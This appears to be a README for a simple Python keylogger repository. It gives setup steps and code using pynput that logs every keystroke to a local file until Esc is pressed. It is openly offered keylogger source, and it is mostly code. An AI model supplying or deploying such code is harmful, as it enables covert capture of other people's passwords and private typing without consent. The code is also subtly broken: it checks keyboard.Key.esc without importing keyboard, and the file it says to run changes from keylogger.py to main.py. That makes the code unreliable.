# keylogger_python

A simple keylogger made in python.

## How to use

1. Clone the repository
2. Run the keylogger.py file
3. The keylogger will start running and will log all the keys pressed by the user
4. To stop the keylogger, press the `esc` key
5. The log file will be saved in the same directory as the keylogger.py file
6. The log file will contain all the keys pressed by the user

## Requirements

1. Python 3.x
2. pynput library

## How to install pynput library

1. Open the terminal
2. Run the following command:
```
pip install pynput
```

## Step by step code implementation

1. Import the pynput library
```python
from pynput.keyboard import Key, Listener
```
2. Define a function to write the key to a file
```python
def on_press(key):
    try:
        with open(output_file, "a") as f:
            f.write(key.char)
    # If the key is not a character, then it is a special key
    except AttributeError:
        with open(output_file, "a") as f:
            f.write(f"\n[{key}] pressed\n")
```
3. Define a function to stop the keylogger
```python
def on_release(key):
    if key == keyboard.Key.esc:
        return False
```
4. Define the output file
```python
output_file = "key_logs.txt"
```
5. Start the keylogger
```python
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```
6. Run the keylogger
```
python main.py
```
